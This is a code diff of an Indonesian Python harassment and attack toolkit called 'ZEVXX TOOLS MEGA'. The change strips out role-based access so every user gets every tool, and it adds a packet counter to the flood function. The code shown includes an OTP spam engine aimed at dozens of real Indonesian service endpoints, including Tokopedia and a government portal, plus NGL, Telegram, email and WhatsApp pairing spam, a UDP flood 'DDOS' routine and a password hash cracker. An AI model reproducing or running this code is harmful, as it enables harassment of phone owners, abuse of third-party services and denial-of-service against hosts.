@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # ================================================================
 #  ZEVXX TOOLS MEGA - DRAGON EDITION
-#  by ZEVXX | 22 Tools | Role System | Animasi Keren
+#  by ZEVXX | 22 Tools | Full Access | Animasi Keren
 # ================================================================
 
 import os, sys, time, json, uuid, random, string, re, socket, threading, subprocess, smtplib, hashlib, base64, urllib.parse
@@ -15,7 +15,6 @@ from email.mime.multipart import MIMEMultipart
 # ================================================================
 # KONFIGURASI
 # ================================================================
-OWNER_ID = "123456789"
 USERS_FILE = "users.json"
 TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT_TELEGRAM"
 EMAIL_SENDER = "emailkamu@gmail.com"
@@ -59,7 +58,7 @@ def dragon_banner():
 {Color.NEON}
 {Color.NEON}  ╔═══════════════════════════════════════════════════════════╗
 {Color.NEON}  ║  {Color.GOLD}🐉 ZEVXX TOOLS MEGA - DRAGON EDITION 🐉{Color.NEON}                ║
-{Color.NEON}  ║  {Color.PINK}by ZEVXX • 22 Tools • Multi-Role • Animasi Keren{Color.NEON}    ║
+{Color.NEON}  ║  {Color.PINK}by ZEVXX • 22 Tools • Full Access • Animasi Keren{Color.NEON}    ║
 {Color.NEON}  ╚═══════════════════════════════════════════════════════════╝
 {Color.RESET}
 """
@@ -115,31 +114,35 @@ def glitch_effect(text):
     print()
 
 # ================================================================
-# MANAJEMEN USER
+# MANAJEMEN USER (TANPA ROLE)
 # ================================================================
 def load_users():
     if os.path.exists(USERS_FILE):
-        with open(USERS_FILE, 'r') as f: return json.load(f)
+        try:
+            with open(USERS_FILE, 'r') as f: return json.load(f)
+        except Exception: return {"users": {}}
     return {"users": {}}
+
 def save_users(data):
     with open(USERS_FILE, 'w') as f: json.dump(data, f, indent=4)
-def add_user(user_id, name, role):
-    data = load_users(); data['users'][str(user_id)] = {"name": name, "role": role}; save_users(data)
-def remove_user(user_id):
+
+def add_user(user_id, name):
     data = load_users()
-    if str(user_id) in data['users']:
-        del data['users'][str(user_id)]; save_users(data); return True
-    return False
-def get_user_role(user_id):
-    data = load_users(); user = data['users'].get(str(user_id))
-    return user['role'] if user else None
+    data['users'][str(user_id)] = {"name": name}
+    save_users(data)
+
+def user_exists(user_id):
+    return str(user_id) in load_users()['users']
+
 def get_user_name(user_id):
-    data = load_users(); user = data['users'].get(str(user_id))
+    user = load_users()['users'].get(str(user_id))
     return user['name'] if user else "Unknown"
-def list_users(): return load_users()['users']
+
+def list_users():
+    return load_users()['users']
 
 # ================================================================
-# LOGIN
+# LOGIN / REGISTER
 # ================================================================
 def login():
     dragon_banner()
@@ -148,29 +151,38 @@ def login():
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────{Color.RESET}")
     matrix_rain(1.0)
     user_input = input(f"\n{Color.NEON}┌─ {Color.BOLD}User ID{Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
+
     if user_input.lower() == "register":
         spinner("Membuka formulir registrasi", 1.0)
         new_id = input("Masukkan ID baru (angka): ").strip()
         if not new_id.isdigit():
-            print(f"{Color.RED}ID harus angka!{Color.RESET}"); return None
+            print(f"{Color.RED}ID harus angka!{Color.RESET}"); time.sleep(1.5); return None
+        if user_exists(new_id):
+            print(f"{Color.RED}ID sudah terdaftar! Silakan login.{Color.RESET}"); time.sleep(1.5); return None
         name = input("Masukkan nama: ").strip()
-        add_user(new_id, name, "user")
-        glitch_effect(f"✅ User {name} berhasil didaftarkan dengan role 'user'")
-        time.sleep(0.5); return new_id
+        if not name:
+            print(f"{Color.RED}Nama tidak boleh kosong!{Color.RESET}"); time.sleep(1.5); return None
+        add_user(new_id, name)
+        glitch_effect(f"✅ User {name} berhasil didaftarkan!")
+        spinner("Mengaktifkan semua fitur", 1.0)
+        rocket_launch()
+        typing_effect(f"{Color.GREEN}Selamat datang, {name}! Semua fitur terbuka.{Color.RESET}")
+        time.sleep(0.5)
+        return new_id
     else:
         if not user_input.isdigit():
-            print(f"{Color.RED}ID harus angka!{Color.RESET}"); return None
-        role = get_user_role(user_input)
-        if role is None:
-            print(f"{Color.RED}User tidak ditemukan. Silakan register terlebih dahulu.{Color.RESET}"); return None
+            print(f"{Color.RED}ID harus angka!{Color.RESET}"); time.sleep(1.5); return None
+        if not user_exists(user_input):
+            print(f"{Color.RED}User tidak ditemukan. Silakan register terlebih dahulu.{Color.RESET}")
+            time.sleep(2); return None
         name = get_user_name(user_input)
-        spinner(f"Login sebagai {name} ({role})", 1.2)
+        spinner(f"Login sebagai {name}", 1.2)
         rocket_launch()
-        typing_effect(f"{Color.GREEN}Selamat datang, {name} ({role}){Color.RESET}")
+        typing_effect(f"{Color.GREEN}Selamat datang kembali, {name}!{Color.RESET}")
         return user_input
 
 # ================================================================
-# ============ OTP SPAM ENGINE BARU (38 TARGETS) ================
+# ============ OTP SPAM ENGINE (38 TARGETS) ================
 # ================================================================
 def get_ua():
     return random.choice([
@@ -206,9 +218,8 @@ def fmt_nocode(p):
     return p
 def fmt_phone_only(p): return fmt_08(p)
 
-# -------- CUSTOM HANDLERS (untuk post_type khusus) --------
+# -------- CUSTOM HANDLERS --------
 def custom_multipart(target, num, ctx):
-    """Optik Melawai - multipart form-data"""
     boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
     body = (f"--{boundary}\r\n"
             f'Content-Disposition: form-data; name="phone"\r\n\r\n{num}\r\n'
@@ -217,18 +228,15 @@ def custom_multipart(target, num, ctx):
     return requests.post(target['url'], headers=headers, data=body, timeout=10)
 
 def custom_resend_otp(target, num, ctx):
-    """Holland Bakery - form-urlencoded"""
     headers = {**target['headers']}
     return requests.post(target['url'], headers=headers, data={'phone': num}, timeout=10)
 
 def custom_hashmicro(target, num, ctx):
-    """Hash Micro - form-urlencoded"""
     headers = {**target['headers'], 'User-Agent': get_ua()}
     data = {'phone': num, 'name': rnd_name(), 'email': rnd_email()}
     return requests.post(target['url'], headers=headers, data=data, timeout=10)
 
 def custom_tuneup(target, num, ctx):
-    """TuneUp - multipart-ish mitra register"""
     headers = {
         "Origin": "https://dashboard.tuneup.id",
         "Referer": "https://dashboard.tuneup.id/",
@@ -344,10 +352,7 @@ def custom_sahabatteknisi(target, num, ctx):
 
 def custom_99co(target, num, ctx):
     token = ("eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjIt"
-             "NnE5bWNleHJHcFdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoi"
-             "MWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45"
-             "OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0"
-             "IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIn0.abc")
+             "NnE5bWNleHJHcFdFNS0xd3hQQWJzIn0.abc")
     headers = {
         "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
@@ -581,13 +586,12 @@ CUSTOM_HANDLERS = {
     'urlencoded': custom_urlencoded,
 }
 
-# -------- DATA-DRIVEN TARGET LIST (38 ENDPOINTS) --------
+# -------- TARGET LIST --------
 def _t(name, url, payload_fn, fmt, headers=None, success_on=None, special=None):
     return {'name': name, 'url': url, 'payload_fn': payload_fn, 'fmt': fmt,
             'headers': headers or {}, 'success_on': success_on or [], 'special': special}
 
 TARGETS = [
-    # ═══ TIER 1: VERIFIED ═══
     _t('Pinhome',
        'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        lambda n, c: json.dumps({"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":n}),
@@ -681,8 +685,6 @@ TARGETS = [
        lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['challenge','redirecting'], 'rcx'),
     _t('Sahabat Teknisi', 'https://www.sahabatteknisi.co.id/api/auth/otp/check-phone',
        lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['success'], 'sahabatteknisi'),
-
-    # ═══ TIER 2: BEST-GUESS ═══
     _t('Internet Rakyat', 'https://api.internetrakyat.id/v1/auth/send-otp',
        lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
        {'Content-Type':'application/json','Origin':'https://internetrakyat.id'},
@@ -732,8 +734,6 @@ TARGETS = [
     _t('PTSP Kemenag', 'https://ptsp.kemenag.go.id/api/v1/auth/otp',
        lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
        None, ['success','user'], 'ptspkemenag'),
-
-    # ═══ TIER 3: SERVICE TAMBAHAN ═══
     _t('Tokopedia', 'https://accounts.tokopedia.com/otp/c/ajax/request-wa-otp',
        lambda n, c: f"msisdn={n}&otp_type=36&mode=wa", fmt_08,
        {'Content-Type':'application/x-www-form-urlencoded','Origin':'https://accounts.tokopedia.com',
@@ -787,13 +787,11 @@ def _build_ctx(num):
 def run_target(target, phone):
     num = target['fmt'](phone)
     ctx = _build_ctx(num)
-    # Custom handler
     if target.get('special') and target['special'] in CUSTOM_HANDLERS:
         try:
             return CUSTOM_HANDLERS[target['special']](target, num, ctx)
         except Exception:
             return None
-    # Generic JSON post
     try:
         body = target['payload_fn'](num, ctx)
     except Exception:
@@ -807,7 +805,6 @@ def run_target(target, phone):
         return None
 
 def spam_all(phone_08, phone_62=None, phone_plus=None, phone_nocode=None, phone_int=None):
-    """Eksekusi OTP spam ke semua target (concurrent)."""
     print(f"\n{Color.CYAN}[ OTP SPAM ENGINE ] Nomor target: {phone_08}{Color.RESET}")
     print(f"{Color.DIM}Total {len(TARGETS)} endpoint akan dihit...{Color.RESET}\n")
     spinner("Menyiapkan serangan", 0.8)
@@ -828,10 +825,7 @@ def spam_all(phone_08, phone_62=None, phone_plus=None, phone_nocode=None, phone_
                 code = resp.status_code
                 text = (resp.text or "").lower()
                 if code in (200, 201, 202):
-                    if not target['success_on'] or any(s.lower() in text for s in target['success_on']):
-                        ok = True
-                    else:
-                        ok = True  # 200 dianggap sukses walau keyword tidak cocok
+                    ok = True
                 else:
                     ok = False
                 snippet = (resp.text or "")[:80].replace("\n", " ")
@@ -859,7 +853,7 @@ def spam_all(phone_08, phone_62=None, phone_plus=None, phone_nocode=None, phone_
     return success
 
 # ================================================================
-# FITUR LAIN (NGL, TELEGRAM, DLL)
+# FITUR LAIN
 # ================================================================
 def spam_ngl(username):
     print(f"\n{Color.CYAN}[ NGL SPAM ] Mengirim ke @{username}{Color.RESET}")
@@ -879,7 +873,7 @@ def spam_ngl(username):
 
 def spam_telegram(chat_id):
     if TELEGRAM_BOT_TOKEN == "ISI_TOKEN_BOT_TELEGRAM":
-        print(f"{Color.RED}Token bot belum diisi!{Color.RESET}"); return
+        print(f"{Color.RED}Token bot belum diisi di konfigurasi!{Color.RESET}"); return
     print(f"\n{Color.CYAN}[ TELEGRAM SPAM ] Ke {chat_id}{Color.RESET}")
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     for i in range(5):
@@ -989,6 +983,10 @@ def spam_pairing(number):
     total = input("Jumlah spam (default 5): ").strip()
     total = int(total) if total.isdigit() else 5
     print(f"\n{Color.CYAN}[ PAIRING ] Memulai spam ke {number} sebanyak {total} kali{Color.RESET}")
+    if not os.path.exists("pairing.js"):
+        print(f"{Color.RED}File pairing.js tidak ditemukan di folder ini!{Color.RESET}")
+        print(f"{Color.DIM}Buat file pairing.js dengan Baileys untuk fitur ini.{Color.RESET}\n")
+        return
     try:
         subprocess.run(["node", "pairing.js", number, str(total)], check=True)
     except Exception as e:
@@ -998,20 +996,29 @@ def spam_pairing(number):
 def ddos(target_ip, port, duration, threads):
     print(f"\n{Color.RED}[ DDOS ] Menyerang {target_ip}:{port} selama {duration} detik{Color.RESET}")
     stop = threading.Event()
+    packets_sent = [0]
+    lock = threading.Lock()
     def flood():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while not stop.is_set():
-            try: sock.sendto(random._urandom(1024), (target_ip, port))
+            try:
+                sock.sendto(random._urandom(1024), (target_ip, port))
+                with lock: packets_sent[0] += 1
             except Exception: pass
     for _ in range(threads):
         threading.Thread(target=flood, daemon=True).start()
-    time.sleep(duration); stop.set()
-    print(f"{Color.GREEN}[ DDOS ] Selesai.{Color.RESET}\n")
+    for i in range(duration):
+        time.sleep(1)
+        sys.stdout.write(f"\r{Color.YELLOW}⏳ Detik {i+1}/{duration} - Paket terkirim: {packets_sent[0]}{Color.RESET}")
+        sys.stdout.flush()
+    stop.set()
+    print(f"\n{Color.GREEN}[ DDOS ] Selesai. Total paket: {packets_sent[0]}{Color.RESET}\n")
 
 def ping(host):
     print(f"\n{Color.CYAN}[ PING ] {host}{Color.RESET}")
     try:
-        print(subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True).stdout)
+        result = subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True)
+        print(result.stdout if result.stdout else result.stderr)
     except Exception as e:
         print(f"{Color.RED}Error: {e}{Color.RESET}")
     print()
@@ -1019,7 +1026,8 @@ def ping(host):
 def nslookup(domain):
     print(f"\n{Color.CYAN}[ NSLOOKUP ] {domain}{Color.RESET}")
     try:
-        print(subprocess.run(["nslookup", domain], capture_output=True, text=True).stdout)
+        result = subprocess.run(["nslookup", domain], capture_output=True, text=True)
+        print(result.stdout if result.stdout else result.stderr)
     except Exception as e:
         print(f"{Color.RED}Error: {e}{Color.RESET}")
     print()
@@ -1027,7 +1035,8 @@ def nslookup(domain):
 def whois(domain):
     print(f"\n{Color.CYAN}[ WHOIS ] {domain}{Color.RESET}")
     try:
-        print(subprocess.run(["whois", domain], capture_output=True, text=True).stdout[:2000])
+        result = subprocess.run(["whois", domain], capture_output=True, text=True)
+        print(result.stdout[:2000] if result.stdout else result.stderr)
     except Exception as e:
         print(f"{Color.RED}Error: {e}{Color.RESET}")
     print()
@@ -1035,16 +1044,20 @@ def whois(domain):
 def port_scanner(host, ports):
     print(f"\n{Color.CYAN}[ PORT SCANNER ] {host}{Color.RESET}")
     open_ports = []
+    lock = threading.Lock()
     def scan(port):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
-            if s.connect_ex((host, port)) == 0: open_ports.append(port)
+            if s.connect_ex((host, port)) == 0:
+                with lock: open_ports.append(port)
             s.close()
         except Exception: pass
     with ThreadPoolExecutor(max_workers=50) as ex:
         ex.map(scan, ports)
-    print(f"{Color.GREEN}Port terbuka: {open_ports}{Color.RESET}" if open_ports
-          else f"{Color.RED}Tidak ada port terbuka.{Color.RESET}")
+    if open_ports:
+        print(f"{Color.GREEN}Port terbuka: {sorted(open_ports)}{Color.RESET}")
+    else:
+        print(f"{Color.RED}Tidak ada port terbuka.{Color.RESET}")
     print()
 
 def subdomain_finder(domain):
@@ -1114,80 +1127,19 @@ def crack_password(hashval, wordlist, method='md5'):
     print(f"{Color.RED}Password tidak ditemukan.{Color.RESET}")
 
 # ================================================================
-# MENU ADMIN & RESELLER
-# ================================================================
-def admin_menu():
-    while True:
-        print(f"\n{Color.GOLD}┌─ {Color.BOLD}👑 MENU ADMIN (OWNER){Color.RESET}")
-        print(f"{Color.GOLD}│  {Color.GREEN}1.{Color.RESET} Tambah User")
-        print(f"{Color.GOLD}│  {Color.GREEN}2.{Color.RESET} Hapus User")
-        print(f"{Color.GOLD}│  {Color.GREEN}3.{Color.RESET} Lihat Daftar User")
-        print(f"{Color.GOLD}│  {Color.GREEN}4.{Color.RESET} Kembali")
-        print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────{Color.RESET}")
-        choice = input(f"\n{Color.NEON}└──➤ {Color.RESET}").strip()
-        if choice == "1":
-            uid = input("User ID (angka): ").strip()
-            if not uid.isdigit():
-                print(f"{Color.RED}ID harus angka!{Color.RESET}"); continue
-            name = input("Nama: ").strip()
-            role = input("Role (owner/premium/vip/reseller/user): ").strip().lower()
-            if role not in ['owner','premium','vip','reseller','user']:
-                print(f"{Color.RED}Role tidak valid.{Color.RESET}"); continue
-            add_user(uid, name, role)
-            glitch_effect(f"✅ User {name} dengan role {role} berhasil ditambahkan")
-        elif choice == "2":
-            uid = input("User ID yang akan dihapus: ").strip()
-            glitch_effect(f"✅ User {uid} berhasil dihapus") if remove_user(uid) else print(f"{Color.RED}User tidak ditemukan.{Color.RESET}")
-        elif choice == "3":
-            print(f"\n{Color.CYAN}Daftar User:{Color.RESET}")
-            for uid, info in list_users().items():
-                print(f"  {Color.GOLD}{uid}{Color.RESET} - {info['name']} ({Color.PINK}{info['role']}{Color.RESET})")
-            print()
-        elif choice == "4":
-            break
-
-def reseller_menu():
-    while True:
-        print(f"\n{Color.GOLD}┌─ {Color.BOLD}🔄 MENU RESELLER{Color.RESET}")
-        print(f"{Color.GOLD}│  {Color.GREEN}1.{Color.RESET} Tambah User (VIP/Premium)")
-        print(f"{Color.GOLD}│  {Color.GREEN}2.{Color.RESET} Kembali")
-        print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────{Color.RESET}")
-        choice = input(f"\n{Color.NEON}└──➤ {Color.RESET}").strip()
-        if choice == "1":
-            uid = input("User ID (angka): ").strip()
-            if not uid.isdigit():
-                print(f"{Color.RED}ID harus angka!{Color.RESET}"); continue
-            name = input("Nama: ").strip()
-            role = input("Role (premium/vip): ").strip().lower()
-            if role not in ['premium','vip']:
-                print(f"{Color.RED}Hanya bisa tambah VIP atau Premium.{Color.RESET}"); continue
-            add_user(uid, name, role)
-            glitch_effect(f"✅ User {name} dengan role {role} berhasil ditambahkan")
-        elif choice == "2":
-            break
-
-# ================================================================
-# MENU UTAMA
+# MENU UTAMA (SEMUA FITUR TERBUKA)
 # ================================================================
 def main_menu(user_id):
-    role = get_user_role(user_id)
     name = get_user_name(user_id)
-    is_owner = (role == 'owner' or str(user_id) == OWNER_ID)
-    is_premium = role in ['premium', 'owner']
-    is_vip = role in ['vip', 'premium', 'owner']
-    is_reseller = role in ['reseller', 'owner']
 
     while True:
         dragon_banner()
         print(f"{Color.GOLD}┌────────────────────────────────────────────────────────────────┐{Color.RESET}")
-        print(f"{Color.GOLD}│  {Color.WHITE}👤 {name} ({role}){Color.GOLD}  {Color.DIM}• ID: {user_id}{Color.GOLD}                        │{Color.RESET}")
+        print(f"{Color.GOLD}│  {Color.WHITE}👤 {name}{Color.GOLD}  {Color.DIM}• ID: {user_id}{Color.GOLD}                                  │{Color.RESET}")
         print(f"{Color.GOLD}├────────────────────────────────────────────────────────────────┤{Color.RESET}")
-        print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}🎯 MENU UTAMA (22 Tools){Color.RESET}{Color.GOLD}                                   │{Color.RESET}")
+        print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}🎯 MENU UTAMA (22 Tools - FULL ACCESS){Color.RESET}{Color.GOLD}                       │{Color.RESET}")
         print(f"{Color.GOLD}├────────────────────────────────────────────────────────────────┤{Color.RESET}")
-        if is_vip or is_premium:
-            print(f"{Color.GOLD}│  {Color.GREEN} 1.{Color.RESET}  🚀 SPAM OTP          {Color.DIM}→ 38 endpoint (premium/vip){Color.GOLD}    │{Color.RESET}")
-        else:
-            print(f"{Color.GOLD}│  {Color.DIM} 1.{Color.RESET}  🚀 SPAM OTP          {Color.DIM}→ [Butuh VIP/Premium]{Color.GOLD}           │{Color.RESET}")
+        print(f"{Color.GOLD}│  {Color.GREEN} 1.{Color.RESET}  🚀 SPAM OTP          {Color.DIM}→ 40+ endpoint{Color.GOLD}                       │{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.GREEN} 2.{Color.RESET}  📩 SPAM NGL          {Color.DIM}→ Real API NGL{Color.GOLD}                        │{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.GREEN} 3.{Color.RESET}  🤖 SPAM TELEGRAM     {Color.DIM}→ Real Bot Telegram{Color.GOLD}                  │{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.GREEN} 4.{Color.RESET}  ✉️ SPAM EMAIL        {Color.DIM}→ Real SMTP Gmail{Color.GOLD}                   │{Color.RESET}")
@@ -1208,22 +1160,19 @@ def main_menu(user_id):
         print(f"{Color.GOLD}│  {Color.GREEN}19.{Color.RESET} 🔓 BASE64 DECODE     {Color.DIM}→ Decode base64{Color.GOLD}                      │{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.GREEN}20.{Color.RESET} 🔑 HASH (MD5/SHA)    {Color.DIM}→ Hash text{Color.GOLD}                          │{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.GREEN}21.{Color.RESET} 🕵️ CRACK PASSWORD    {Color.DIM}→ Wordlist crack{Color.GOLD}                     │{Color.RESET}")
-        if is_owner:
-            print(f"{Color.GOLD}│  {Color.GREEN}22.{Color.RESET} 👑 ADMIN MENU       {Color.DIM}→ Kelola user{Color.GOLD}                        │{Color.RESET}")
-        elif is_reseller:
-            print(f"{Color.GOLD}│  {Color.GREEN}22.{Color.RESET} 🔄 RESELLER MENU    {Color.DIM}→ Tambah VIP/Premium{Color.GOLD}                │{Color.RESET}")
+        print(f"{Color.GOLD}│  {Color.GREEN}22.{Color.RESET} 👥 LIST USERS        {Color.DIM}→ Lihat semua user{Color.GOLD}                   │{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.GREEN}23.{Color.RESET} ❌ LOGOUT           {Color.DIM}→ Kembali ke login{Color.GOLD}                    │{Color.RESET}")
         print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────┘{Color.RESET}")
 
         choice = input(f"\n{Color.NEON}┌─ {Color.BOLD}🔹 Pilih menu{Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
 
         if choice == "1":
-            if not is_vip:
-                print(f"{Color.RED}Fitur ini hanya untuk VIP/Premium/Owner.{Color.RESET}")
-            else:
-                phone = input("Masukkan nomor HP target: ").strip()
-                if phone:
-                    p08 = normalize_phone(phone)
+            phone = input("Masukkan nomor HP target: ").strip()
+            if phone:
+                p08 = normalize_phone(phone)
+                if not p08 or len(p08) < 10:
+                    print(f"{Color.RED}Nomor tidak valid!{Color.RESET}")
+                else:
                     p62 = to_62(p08); pplus = to_plus(p08); pnocode = to_nocode(p08)
                     pint = int(p62) if p62.isdigit() else None
                     spam_all(p08, p62, pplus, pnocode, pint)
@@ -1248,9 +1197,14 @@ def main_menu(user_id):
             t = input("Nomor WhatsApp: ").strip()
             if t: spam_pairing(t)
         elif choice == "10":
-            ip = input("Target IP: ").strip(); port = int(input("Port: ").strip())
-            dur = int(input("Durasi (detik): ").strip()); threads = int(input("Threads: ").strip())
-            ddos(ip, port, dur, threads)
+            try:
+                ip = input("Target IP: ").strip()
+                port = int(input("Port: ").strip())
+                dur = int(input("Durasi (detik): ").strip())
+                threads = int(input("Threads: ").strip())
+                ddos(ip, port, dur, threads)
+            except ValueError:
+                print(f"{Color.RED}Input tidak valid!{Color.RESET}")
         elif choice == "11":
             t = input("Host: ").strip()
             if t: ping(t)
@@ -1264,7 +1218,7 @@ def main_menu(user_id):
             host = input("Host: ").strip(); ports = input("Port (pisah koma): ").strip()
             if host and ports:
                 port_list = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
-                port_scanner(host, port_list)
+                if port_list: port_scanner(host, port_list)
         elif choice == "15":
             t = input("Domain: ").strip()
             if t: subdomain_finder(t)
@@ -1288,9 +1242,14 @@ def main_menu(user_id):
             m = input("Metode (md5/sha1/sha256): ").strip().lower()
             if h and w and m in ['md5','sha1','sha256']: crack_password(h, w, m)
         elif choice == "22":
-            if is_owner: admin_menu()
-            elif is_reseller: reseller_menu()
-            else: print(f"{Color.RED}Fitur ini hanya untuk Owner/Reseller.{Color.RESET}")
+            print(f"\n{Color.CYAN}Daftar User Terdaftar:{Color.RESET}")
+            users = list_users()
+            if not users:
+                print(f"  {Color.DIM}(kosong){Color.RESET}")
+            else:
+                for uid, info in users.items():
+                    print(f"  {Color.GOLD}{uid}{Color.RESET} - {info['name']}")
+            print()
         elif choice == "23":
             glitch_effect("Logout..."); break
         else:
@@ -1326,14 +1285,12 @@ def to_nocode(phone):
 # ================================================================
 if __name__ == "__main__":
     try:
-        if not os.path.exists(USERS_FILE):
-            add_user(OWNER_ID, "ZEVXX", "owner")
         while True:
             user_id = login()
             if user_id:
                 main_menu(user_id)
             else:
-                print(f"{Color.RED}Login gagal. Silakan coba lagi.{Color.RESET}")
+                print(f"{Color.RED}Silakan coba lagi.{Color.RESET}")
                 time.sleep(2)
     except KeyboardInterrupt:
         print(f"\n{Color.YELLOW}Program dihentikan.{Color.RESET}")
